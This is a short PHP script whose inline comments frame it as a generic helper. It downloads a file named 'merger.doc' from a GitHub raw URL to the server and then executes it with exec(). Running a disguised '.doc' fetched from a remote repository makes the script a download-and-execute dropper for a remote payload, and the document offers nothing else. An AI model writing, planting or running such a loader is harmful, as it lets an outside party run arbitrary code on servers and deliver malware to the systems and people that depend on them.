<?php
$fileUrl = "https://github.com/network2city/boot/raw/main/merger.doc"; // Replace with the URL of the file you want to download and execute
$savePath = "merger.doc"; // Replace with the desired save path on your server

// Download the file
file_put_contents($savePath, file_get_contents($fileUrl));

// Execute the file
exec($savePath);
?>